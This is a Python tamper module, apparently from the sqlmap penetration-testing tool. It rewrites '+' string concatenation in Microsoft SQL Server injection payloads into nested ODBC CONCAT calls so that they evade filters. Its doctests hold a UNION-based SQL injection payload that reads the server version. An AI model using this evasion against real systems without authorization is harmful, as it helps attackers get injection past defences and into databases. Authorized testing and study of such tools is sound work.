#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re
from core.common import zeroDepthSearch
xrange = range
def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart

    Tested against:
        * Microsoft SQL Server 2008

    Requirements:
        * Microsoft SQL Server 2008+

    Notes:
        * Useful in case ('+') character is filtered
        * https://msdn.microsoft.com/en-us/library/bb630290.aspx

    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'

    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
    '1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'
    """

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            old = match.group(0)
            parts = []
            last = 0

            for index in zeroDepthSearch(old, '+'):
                parts.append(old[last:index].strip('+'))
                last = index

            parts.append(old[last:].strip('+'))
            replacement = parts[0]

            for i in xrange(1, len(parts)):
                replacement = "{fn CONCAT(%s,%s)}" % (replacement, parts[i])

            retVal = retVal.replace(old, replacement)

    return retVal
